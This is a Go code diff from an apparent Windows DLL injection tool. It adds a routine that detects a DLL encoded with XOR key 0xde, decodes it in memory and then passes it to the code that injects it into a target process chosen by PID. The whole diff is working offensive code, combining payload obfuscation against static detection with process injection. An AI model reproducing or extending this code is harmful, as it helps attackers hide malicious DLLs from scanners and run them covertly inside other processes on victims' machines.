@@ -25,6 +25,23 @@ func openProcess(processID uint32) (windows.Handle, error) {
 	return handle, nil
 }
 
+func Decode_dll(dll_content []byte) ([]byte, error) {
+	dll_decoded := dll_content
+	if dll_content[0]^byte(0xde) == 77 && dll_content[1]^byte(0xde) == 90 { //only valid if the dll has been xored with 'de'
+		fmt.Println("[INFO] -- Encoded dll")
+		counter := 0
+		for counter != len(dll_content) {
+			dll_decoded[counter] = dll_content[counter] ^ 0xde
+			counter++
+		}
+		return dll_decoded, nil
+	} else {
+		fmt.Println("[INFO] -- Not encoded dll")
+		return dll_decoded, nil
+	}
+
+}
+
 func Mainfunc(PID uint32, dll_location string, loading_type string) error {
 	var dll_content []byte
 	var lpBuffer uintptr
@@ -60,6 +77,11 @@ func Mainfunc(PID uint32, dll_location string, loading_type string) error {
 			fmt.Println("Could not get dll content")
 			return err
 		}
+		dll_content, err = Decode_dll(dll_content)
+		if err != nil {
+			fmt.Println("Could not decode dll")
+			return err
+		}
 		lpBuffer = uintptr(unsafe.Pointer(&dll_content[0]))
 	} else {
 
@@ -85,6 +107,11 @@ func Mainfunc(PID uint32, dll_location string, loading_type string) error {
 
 		// 3. Get dll content
 		fmt.Println("\n------ 3. Get dll content")
+		dll_content, err = Decode_dll(dll_content)
+		if err != nil {
+			fmt.Println("Could not decode dll")
+			return err
+		}
 		lpBuffer = uintptr(unsafe.Pointer(&dll_content[0]))
 	}
 
